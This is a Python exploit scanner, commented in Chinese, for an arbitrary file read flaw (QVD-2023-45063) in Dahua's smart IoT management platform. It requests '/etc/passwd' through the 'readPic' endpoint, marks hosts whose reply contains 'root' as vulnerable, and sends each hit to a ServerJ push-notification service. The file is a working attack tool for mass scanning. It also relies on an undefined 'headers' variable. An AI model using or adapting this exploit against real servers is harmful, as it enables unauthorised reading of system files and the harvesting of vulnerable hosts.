# .py
# 大华智能物联综合管理平台 任意文件读取漏洞复现(QVD-2023-45063)
import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os
import urllib.parse
import urllib.request

bugName='大华智能物联综合管理平台 任意文件读取漏洞'
def scan_Dahua_QVD_2023_45063(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    target_url = url + path
    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.get(target_url, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and 'root' in req1.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except requests.ConnectionError as conn_err:
        append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
